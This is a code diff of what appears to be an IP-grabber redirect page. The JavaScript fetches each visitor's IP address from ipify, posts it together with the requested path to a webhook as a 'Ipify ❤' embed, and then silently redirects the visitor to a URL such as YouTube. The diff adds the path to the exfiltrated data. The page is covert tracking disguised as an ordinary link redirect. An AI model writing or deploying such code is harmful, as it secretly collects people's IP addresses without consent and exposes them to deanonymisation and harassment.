@@ -9,17 +9,6 @@
       dat = JSON.parse(await dat.text())['ip']
       // let check = await fetch(`https://proxycheck.io/v2/${dat}?key=public-t6xb3j-9j867t-774678?vpn=1`)
       // check = JSON.parse(await check.text())[dat]['proxy']
-      await fetch(webhook, {
-                  body: JSON.stringify({
-                      embeds: [{
-                          title: "Ipify ❤",
-                          description: ("IP: " + dat + "\nProxy: "),
-                          footer: {
-                              text: "Requested page: ",
-                          },
-                      }],
-                  }), headers: { "content-type": "application/json" }, method: "POST"
-      })
       redirect = window.location.href.replace(window.location.origin, '').slice(1)
       if (!redirect) {
         redirect = 'https://youtube.com'
@@ -27,6 +16,17 @@
       if (!redirect.includes('http')) {
         redirect = 'https://' + redirect
       }
+      await fetch(webhook, {
+                  body: JSON.stringify({
+                      embeds: [{
+                          title: "Ipify ❤",
+                          description: ("IP: " + dat + "\nPath: " + redirect),
+                          footer: {
+                              text: "Requested page: ",
+                          },
+                      }],
+                  }), headers: { "content-type": "application/json" }, method: "POST"
+      })
       window.location.href = redirect;
     }
     // <meta http-equiv="refresh" content="2; URL=https://www.youtube.com/watch?v=xvFZjo5PgG0" />
